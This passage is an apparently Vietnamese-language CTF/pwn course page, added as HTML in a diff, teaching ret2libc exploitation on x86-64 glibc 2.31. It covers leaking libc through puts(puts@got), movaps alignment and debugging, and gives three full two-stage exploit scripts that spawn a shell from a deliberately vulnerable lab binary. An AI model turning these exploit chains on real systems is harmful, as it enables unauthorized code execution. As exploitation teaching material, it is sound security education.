@@ -1,0 +1,501 @@
+<title>ret2libc</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.ropmap{font-family:var(--font-mono);font-size:12.5px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.rr{display:grid;grid-template-columns:140px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.rr .a{color:var(--mem);white-space:nowrap}
+.rr.pad{opacity:.7}.rr.g{background:var(--mem-soft);border-color:var(--mem)}
+.rr.call{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.toggle-row{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}
+.toggle-row button{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px;cursor:pointer}
+.toggle-row button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 5</div>
+    <h1>ret2libc</h1>
+    <p class="sub">NX bật (không chạy shellcode trên stack) nhưng ta có buffer overflow: <strong>tái dùng hàm có sẵn trong libc</strong> — gọi <code>system("/bin/sh")</code> bằng ROP. Bài này đi <strong>đủ 2 giai đoạn số thật glibc 2.31</strong>: leak libc qua <code>puts(puts@got)</code>, rồi quay lại gọi <code>system</code>, kèm bẫy <mark>movaps alignment</mark>.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung bình (Phase 2)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 NX, no-PIE, Partial RELRO</span>
+      <span class="chip"><b>glibc:</b> 2.31</span>
+      <span class="chip"><b>Thời lượng:</b> ~55 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Leak libc</a><a href="#s4">04 Gọi system</a><a href="#s5">05 ROP builder</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Vấn đề:</strong> NX làm shellcode trên stack không chạy được. Nhưng libc đã có sẵn <code>system</code> và chuỗi <code>"/bin/sh"</code> — chỉ cần gọi chúng.</p>
+    <p><strong>Cách:</strong> dùng overflow đặt một chuỗi ROP: <code>pop rdi; ret</code> → <code>&amp;"/bin/sh"</code> → <code>system</code>. rdi là đối số đầu (SysV).</p>
+    <p><strong>Rào ASLR:</strong> không biết libc base → <strong>leak trước</strong>: gọi <code>puts(puts@got)</code> để in địa chỉ thật của puts → <code>libc.base = leak − libc.sym.puts</code>. Rồi quay lại <code>main</code> và tấn công lần 2.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>leak 1 địa chỉ libc (puts@got) → tính base → pop rdi; "/bin/sh"; system. Nhớ ret-align (movaps).</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🧩 Khung 2 giai đoạn</span>
+<pre><code>G1 (leak):  pad + pop_rdi + puts@got + puts@plt + main
+G2 (shell): pad + ret(align) + pop_rdi + binsh + system</code></pre></div>
+      <div class="combat-row"><span class="lab">🔢 Offset thật 2.31</span>
+<pre><code>libc.sym.puts   = 0x875a0
+libc.sym.system = 0x52290
+next(libc.search("/bin/sh")) = 0x1b45bd
+<span class="c"># libc.base = leak_puts - 0x875a0</span></code></pre></div>
+      <div class="combat-row"><span class="lab">⚡ pwntools gọn</span>
+<pre><code>r = ROP(exe); r.raw(r.find_gadget(["ret"])[0])  <span class="c"># align</span>
+r.call(libc.sym.system, [next(libc.search(b"/bin/sh"))])</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ movaps alignment (bẫy #1)</span>
+        <p><code>system</code> dùng lệnh <code>movaps [rsp],xmm</code> cần <b>rsp căn 0x10</b>. Nếu crash ngay trong system → chèn <b>1 gadget <code>ret</code></b> trước system để dịch stack 8 byte.</p></div>
+      <div class="combat-row"><span class="lab">🔎 Dò offset tràn</span>
+<pre><code>cyclic(200) → crash → cyclic_find(rsp_value)  <span class="c"># = offset tới saved RIP</span></code></pre></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>SysV calling convention &amp; PLT/GOT</h2>
+  <p>Trên x86-64 Linux, 6 đối số đầu truyền qua thanh ghi: <code>rdi, rsi, rdx, rcx, r8, r9</code>. Gọi <code>system("/bin/sh")</code> = đặt <code>rdi = &amp;"/bin/sh"</code> rồi nhảy tới <code>system</code>. Ta không có lệnh <code>mov rdi</code> tùy ý, nên dùng <strong>gadget</strong> <code>pop rdi; ret</code> (lấy giá trị kế trên stack vào rdi).</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">ret2libc</div><p>ROP gọi hàm có sẵn trong libc.</p></div>
+    <div class="card"><div class="term">gadget</div><p>Đoạn lệnh kết thúc <code>ret</code> dùng làm "mảnh" ROP.</p></div>
+    <div class="card"><div class="term">PLT / GOT</div><p>PLT = bàn nhảy hàm; GOT = ô chứa địa chỉ thật (sau lazy bind).</p></div>
+    <div class="card"><div class="term">leak</div><p>In một địa chỉ libc để phá ASLR.</p></div>
+    <div class="card"><div class="term">pop rdi; ret</div><p>Gadget đặt đối số đầu.</p></div>
+    <div class="card"><div class="term">movaps align</div><p>system cần rsp căn 0x10.</p></div>
+  </div>
+  <div class="note"><span class="tag">Vì sao cần leak</span>ASLR random hóa base libc mỗi lần chạy, nhưng <strong>offset nội bộ libc cố định</strong>. Leak 1 hàm (vd puts) → biết base → biết mọi thứ (system, "/bin/sh"). GOT chứa địa chỉ thật của hàm đã resolve → in GOT = leak.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>NX đóng cửa shellcode, mở cửa ROP</h2>
+  <p>NX (No-eXecute) đánh dấu stack/heap không thực thi → shellcode nhét vào đó không chạy. Nhưng <strong>code hợp lệ (libc, binary) vẫn thực thi được</strong>. ret2libc là ý tưởng gốc của ROP: thay vì chạy code mới, ta <em>ghép lại code có sẵn</em> — gọi thẳng một hàm thư viện mạnh (<code>system</code>) với đối số ta chọn. Đây là bước đệm trước các chuỗi ROP phức tạp hơn (<a href="rop_basics.html">rop_basics</a>, <a href="ret2csu.html">ret2csu</a>).</p>
+ </div>
+</section>
+
+<!-- 03 Leak -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / GIAI ĐOẠN 1: LEAK LIBC · MỤC LÕI</div>
+  <h2>puts(puts@got) → in địa chỉ thật</h2>
+  <p>Ta gọi <code>puts</code> với đối số là <strong>địa chỉ ô GOT của puts</strong> — ô đó chứa địa chỉ thật của puts trong libc. puts in ra chuỗi tại đó (8 byte địa chỉ) → ta đọc = leak.</p>
+  <h3>Bố cục stack giai đoạn 1 (số thật, no-PIE)</h3>
+  <div class="ropmap">
+    <div class="rr pad"><span class="a">offset 0..71</span><span>b"A"*72 — lấp buffer tới saved RIP</span></div>
+    <div class="rr g"><span class="a">0x401263</span><span>pop rdi; ret (gadget)</span></div>
+    <div class="rr"><span class="a">0x404018</span><span>puts@got (đối số rdi = địa chỉ ô GOT puts)</span></div>
+    <div class="rr call"><span class="a">0x401064</span><span>puts@plt (gọi puts → in địa chỉ thật)</span></div>
+    <div class="rr"><span class="a">0x401186</span><span>main (quay lại để tấn công lần 2)</span></div>
+  </div>
+  <pre><code><span class="c"># nhận leak:</span>
+leak = u64(p.recvline().strip().ljust(<span class="d">8</span>, b<span class="s">"\x00"</span>))
+libc.address = leak - libc.sym.puts    <span class="c"># 2.31: leak - 0x875a0</span>
+<span class="k">assert</span> libc.address &amp; <span class="d">0xfff</span> == <span class="d">0</span>        <span class="c"># base phải căn trang</span></code></pre>
+  <div class="note tip"><span class="tag">Vì sao quay lại main</span>Sau khi leak, ta chưa biết base lúc dựng payload giai đoạn 1 → không thể gọi system ngay. Nên kết thúc G1 bằng <code>main</code> (hoặc hàm có overflow) để <strong>nhập payload lần 2</strong>, lúc này đã có base.</div>
+ </div>
+</section>
+
+<!-- 04 Gọi system -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / GIAI ĐOẠN 2: GỌI SYSTEM</div>
+  <h2>pop rdi; "/bin/sh"; system — và movaps</h2>
+  <div class="ropmap">
+    <div class="rr pad"><span class="a">offset 0..71</span><span>b"A"*72</span></div>
+    <div class="rr g"><span class="a">0x40101a</span><span>ret (gadget trơn — CĂN rsp về 0x10)</span></div>
+    <div class="rr g"><span class="a">system+..</span><span>pop rdi; ret</span></div>
+    <div class="rr"><span class="a">libc+0x1b45bd</span><span>&amp;"/bin/sh" (rdi)</span></div>
+    <div class="rr call"><span class="a">libc+0x52290</span><span>system → system("/bin/sh")</span></div>
+  </div>
+  <h3>Bẫy movaps alignment (giải thích)</h3>
+  <p><code>system</code> (qua <code>do_system</code>) dùng lệnh SSE <code>movaps xmmword [rsp+N], xmm0</code> — lệnh này <strong>yêu cầu địa chỉ căn 16</strong>. Khi ta ROP, số lượng "return" lẻ có thể làm <code>rsp</code> lệch 8 (căn 0x8 thay vì 0x10) → <code>movaps</code> raise SIGSEGV <em>ngay trong system</em>. Khắc phục: chèn <strong>một gadget <code>ret</code></strong> (pop 8 byte "ảo") trước chuỗi gọi để dịch rsp 8 byte về bội số 16.</p>
+  <div class="note warn"><span class="tag">Dấu hiệu movaps</span>Crash tại một địa chỉ <em>trong libc</em> (không phải payload), backtrace có <code>do_system</code>/<code>movaps</code> → thêm/bớt 1 gadget <code>ret</code>. Nếu crash khi CÓ ret-align thì bỏ nó đi (đã căn sẵn).</div>
+ </div>
+</section>
+
+<!-- 05 ROP builder -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Dựng chuỗi ret2libc</h2>
+  <p>Bật/tắt ret-align để thấy payload đổi. Giá trị dưới là số thật mẫu (no-PIE, libc base 0x7ffff7dc0000).</p>
+  <div class="lab">
+    <div class="toggle-row" id="tg">
+      <button data-g="0" class="active">Giai đoạn 1 (leak)</button>
+      <button data-g="1">Giai đoạn 2 (shell)</button>
+      <button data-g="align">ret-align: BẬT</button>
+    </div>
+    <pre id="builder" style="margin-top:4px"></pre>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Offset tràn &amp; gadget</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Offset tới saved RIP</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> p.sendline(cyclic(<span class="d">200</span>))   <span class="c"># crash</span>
+<span class="p">pwndbg&gt;</span> cyclic -l $rsp          <span class="c"># = 72 (ví dụ)</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Gadget</h4>
+    <pre><code><span class="p">$</span> ROPgadget --binary ./vuln | grep "pop rdi ; ret"   <span class="c"># 0x401263</span>
+<span class="p">$</span> ROPgadget --binary ./vuln | grep ": ret$"           <span class="c"># 0x40101a (align)</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>GOT/PLT &amp; offset libc</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> exe.got.puts, exe.plt.puts, exe.sym.main
+<span class="p">&gt;&gt;&gt;</span> libc.sym.puts, libc.sym.system, <span class="k">next</span>(libc.search(b<span class="s">"/bin/sh"</span>))</code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>2 giai đoạn hoàn chỉnh (glibc 2.31)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie  (NX on mặc định)</span>
+<span class="k">int</span> main(){ <span class="k">char</span> buf[<span class="d">0x40</span>]; read(<span class="d">0</span>, buf, <span class="d">0x200</span>); <span class="k">return</span> <span class="d">0</span>; }   <span class="c">// overflow</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools ROP</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — số thật 2.31, 2 giai đoạn, có ret-align.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF      = <span class="d">72</span>                 <span class="c"># offset tới saved RIP (cyclic)</span>
+pop_rdi  = <span class="d">0x401263</span>
+ret      = <span class="d">0x40101a</span>           <span class="c"># gadget ret (align)</span>
+
+<span class="c"># ---- Giai đoạn 1: leak puts ----</span>
+g1  = b<span class="s">"A"</span>*OFF
+g1 += p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)
+p.send(g1)
+leak = u64(p.recvline().strip().ljust(<span class="d">8</span>, b<span class="s">"\x00"</span>))
+libc.address = leak - libc.sym.puts       <span class="c"># leak - 0x875a0</span>
+<span class="k">assert</span> libc.address &amp; <span class="d">0xfff</span> == <span class="d">0</span>
+log.success(<span class="s">f"libc = {hex(libc.address)}"</span>)
+
+<span class="c"># ---- Giai đoạn 2: system("/bin/sh") ----</span>
+binsh = <span class="k">next</span>(libc.search(b<span class="s">"/bin/sh"</span>))
+g2  = b<span class="s">"A"</span>*OFF
+g2 += p64(ret)                            <span class="c"># CĂN rsp 0x10 (movaps)</span>
+g2 += p64(pop_rdi) + p64(binsh) + p64(libc.sym.system)
+p.send(g2)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Số <code>pop_rdi=0x401263</code>, <code>ret=0x40101a</code>, <code>OFF=72</code> là của binary mẫu — của bạn khác (<code>ROPgadget</code>/<code>cyclic</code>). Offset libc <code>0x875a0</code>/<code>0x52290</code> là glibc 2.31 Ubuntu 20.04; dùng <code>libc.sym</code> để robust. Nếu crash trong system → thêm/bớt <code>p64(ret)</code>.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools ROP class lo gadget + align tự động.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+OFF = <span class="d">72</span>
+
+<span class="c"># G1: leak qua ROP.call</span>
+r = ROP(exe)
+r.call(exe.plt.puts, [exe.got.puts])
+r.call(exe.sym.main)
+p.send(b<span class="s">"A"</span>*OFF + r.chain())
+libc.address = u64(p.recvline().strip().ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)) - libc.sym.puts
+
+<span class="c"># G2: system, ROP tự chèn ret-align</span>
+r2 = ROP(libc)
+r2.raw(r2.find_gadget([<span class="s">"ret"</span>])[<span class="d">0</span>])      <span class="c"># align</span>
+r2.system(<span class="k">next</span>(libc.search(b<span class="s">"/bin/sh"</span>)))
+p.send(b<span class="s">"A"</span>*OFF + r2.chain())
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Mẹo</span><code>ROP(libc).system(binsh)</code> tự tìm <code>pop rdi; ret</code>. Thêm <code>r2.raw(ret)</code> để căn movaps. In <code>hex(libc.address)</code> kiểm (kết thúc 000).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld: leak helper + rebase.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); libc = get_libc(<span class="s">"./libc.so.6"</span>)
+p = start(); OFF = <span class="d">72</span>
+r = ROP(exe); r.call(exe.plt.puts, [exe.got.puts]); r.call(exe.sym.main)
+sl(b<span class="s">"A"</span>*OFF + r.chain())
+rebase_libc(leak=u64(rl().strip().ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)), sym=<span class="s">"puts"</span>)   <span class="c"># base = leak - LIBC.sym.puts</span>
+r2 = ROP(LIBC); r2.raw(r2.find_gadget([<span class="s">"ret"</span>])[<span class="d">0</span>]); r2.system(<span class="k">next</span>(LIBC.search(b<span class="s">"/bin/sh"</span>)))
+sl(b<span class="s">"A"</span>*OFF + r2.chain()); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>rebase_libc(leak, sym="puts")</code> tự trừ <code>LIBC.sym.puts</code>. Phần ROP vẫn dùng pwntools ROP class.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Leak ra số lẻ (không ...000)</h4><p>Đọc nhầm dòng, hoặc puts không in (null byte cắt). Kiểm output.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Crash trong system</h4><p>movaps alignment. Thêm/bớt 1 gadget <code>ret</code>.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Local OK, remote fail</h4><p>libc remote khác. Dùng libc đề + patchelf; nhận diện qua leak (libc-database).</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ROPgadget / ropper</div><h4>Tìm gadget</h4><p><code>pop rdi; ret</code>, <code>ret</code>.</p></div>
+    <div class="card"><div class="term">pwntools ROP</div><h4>Dựng chuỗi</h4><p><code>ROP(libc).system(binsh)</code>, auto-align.</p></div>
+    <div class="card"><div class="term">cyclic</div><h4>Offset tràn</h4><p><code>cyclic</code> + <code>cyclic -l</code>.</p></div>
+    <div class="card"><div class="term">libc-database / patchelf</div><h4>Đúng libc</h4><p>Nhận libc từ leak; chạy đúng libc đề.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi không ra shell</h2>
+  <div class="grid">
+    <div class="card"><h4>movaps crash</h4><p>rsp không căn 0x10. Thêm/bớt 1 gadget <code>ret</code> trước system.</p></div>
+    <div class="card"><h4>Offset sai</h4><p>pop_rdi không nhận đúng đối số. Dò lại cyclic.</p></div>
+    <div class="card"><h4>Leak = rác</h4><p>puts gặp null sớm, hoặc đọc nhầm. In raw output.</p></div>
+    <div class="card"><h4>Không có pop rdi</h4><p>Dùng <a href="ret2csu.html">ret2csu</a> để set rdi, hoặc gadget khác.</p></div>
+    <div class="card"><h4>PIE bật</h4><p>Cần leak ELF base trước (địa chỉ 0x55…). Gadget/GOT là offset + base.</p></div>
+    <div class="card"><h4>Full RELRO</h4><p>GOT read-only — leak vẫn được (chỉ đọc), nhưng không ghi GOT; ret2libc không cần ghi GOT nên vẫn chạy.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & KIẾN TRÚC</div>
+  <h2>x86 vs x86-64, one_gadget</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Khía cạnh</th><th>x86-64</th><th>x86 (32-bit)</th></tr></thead>
+    <tbody>
+      <tr><td>Truyền đối số</td><td>rdi (gadget pop rdi)</td><td>Trên STACK: <code>system; ret; &amp;binsh</code> — không cần gadget pop</td></tr>
+      <tr><td>movaps align</td><td>CÓ (cần ret-align)</td><td>Không</td></tr>
+      <tr><td>Leak</td><td>puts(puts@got) 8 byte</td><td>puts/printf 4 byte</td></tr>
+    </tbody>
+  </table></div>
